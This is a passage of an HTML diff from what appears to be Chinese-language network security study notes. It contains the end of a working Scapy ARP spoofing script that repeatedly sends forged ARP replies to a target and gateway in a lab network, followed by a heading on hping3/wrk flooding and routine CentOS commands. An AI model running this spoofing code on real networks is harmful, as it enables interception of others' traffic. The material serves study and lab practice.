+<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 被攻击主机的MAC和IP,kali</span></span>
+<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a>    spoof_ip <span class="op">=</span> <span class="st">&#39;192.168.104.129&#39;</span></span>
+<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a>    spoof_mac <span class="op">=</span> <span class="st">&#39;00:0c:29:8e:52:c1&#39;</span></span>
+<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a>    <span class="co"># 真实网关的MAC和IP</span></span>
+<span id="cb20-33"><a href="#cb20-33" aria-hidden="true" tabindex="-1"></a>    gateway_ip <span class="op">=</span> <span class="st">&#39;192.168.104.2&#39;</span></span>
+<span id="cb20-34"><a href="#cb20-34" aria-hidden="true" tabindex="-1"></a>    gateway_mac <span class="op">=</span> <span class="st">&#39;00:50:56:ea:a2:db&#39;</span></span>
+<span id="cb20-35"><a href="#cb20-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-36"><a href="#cb20-36" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="va">True</span>:</span>
+<span id="cb20-37"><a href="#cb20-37" aria-hidden="true" tabindex="-1"></a>        packet <span class="op">=</span> Ether(src<span class="op">=</span>spoof_mac, dst<span class="op">=</span>target_mac)<span class="op">/</span>ARP(hwsrc<span class="op">=</span>spoof_mac, psrc<span class="op">=</span>gateway_ip, hwdst<span class="op">=</span>target_mac, pdst<span class="op">=</span>target_ip, op<span class="op">=</span><span class="dv">2</span>)</span>
+<span id="cb20-38"><a href="#cb20-38" aria-hidden="true" tabindex="-1"></a>        sendp(packet,iface<span class="op">=</span>iface)</span>
+<span id="cb20-39"><a href="#cb20-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-40"><a href="#cb20-40" aria-hidden="true" tabindex="-1"></a>        packet <span class="op">=</span> Ether(src<span class="op">=</span>spoof_mac, dst<span class="op">=</span>gateway_mac)<span class="op">/</span>ARP(hwsrc<span class="op">=</span>spoof_mac, psrc<span class="op">=</span>target_ip, hwdst<span class="op">=</span>gateway_mac, pdst<span class="op">=</span>gateway_ip, op<span class="op">=</span><span class="dv">2</span>)</span>
+<span id="cb20-41"><a href="#cb20-41" aria-hidden="true" tabindex="-1"></a>        sendp(packet, iface<span class="op">=</span>iface)</span>
+<span id="cb20-42"><a href="#cb20-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-43"><a href="#cb20-43" aria-hidden="true" tabindex="-1"></a>        time.sleep(<span class="dv">1</span>)</span>
+<span id="cb20-44"><a href="#cb20-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-45"><a href="#cb20-45" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb20-46"><a href="#cb20-46" aria-hidden="true" tabindex="-1"></a>    arp_spoof()</span></code></pre></div>
 <p>​</p>
 <h3 id="hping3和wrk泛洪">hping3和wrk泛洪</h3>
 <ol type="1">
@@ -826,7 +918,11 @@ alt="image-20220811173548351" />
 </ul>
 </blockquote>
 <h3 id="centos一些命令">CentOs一些命令</h3>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uptime</span></span><br><span class="line">netstat -anutl</span><br><span class="line">firewall-cmd --add-port=80/tcp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="fu">uptime</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="fu">netstat</span> <span class="at">-anutl</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">firewall-cmd</span> <span class="at">--add-port</span><span class="op">=</span>80/tcp</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ss</span></span></code></pre></div>
 <figure>
 <img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"
 alt="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png" />
